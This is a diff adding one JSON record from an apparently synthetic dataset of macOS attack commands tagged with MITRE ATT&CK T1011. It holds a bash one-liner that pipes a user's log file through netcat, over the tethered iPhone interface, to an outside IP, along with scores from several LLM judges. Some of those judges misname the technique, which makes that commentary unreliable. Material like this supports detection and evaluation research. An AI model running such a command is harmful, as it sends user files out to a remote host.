@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "dd if=/Users/$USER/Library/Logs/system.log bs=64k | nc -s \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.77 53499",
+  "explanation": "Streams log data bound to the iPhone USB (cellular tether) interface, exfiltrating over a cellular/USB medium per T1011.",
+  "rationale_steps": [
+    "Obtain iPhone USB IP using networksetup",
+    "Bind TCP connection to the tethered IP",
+    "Send data to a non-standard high port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-a2e10d12",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for both dd and nc commands, and correct use of command substitution with proper nesting.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network connection, it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1011 (System Script Proxy Execution) as claimed, as it doesn't abuse trusted system scripts for execution.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:41:30.046368Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid commands, flags, balanced quotes, and correct command substitutions for a Bash shell on macOS.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates log data over a network, which is an operational action, but it does not employ 'System Script Proxy Execution' as described by MITRE ATT&CK T1011.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T04:41:38.864255Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The pipeline, quoting, command substitution, and flags (dd bs=64k, nc -s with parsed IP) are well-formed and parseable in Bash on macOS.",
+        "semantic_score": 3,
+        "semantic_justification": "While piping file contents to nc with a source IP bound to the iPhone USB interface conceptually aligns with exfiltration over an alternate medium (T1011), the likely nonexistent log path (~Library/Logs/system.log) and the use of a reserved, non-routable IP (198.51.100.77) make actual execution unlikely to achieve the stated intent.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T04:42:14.968607Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
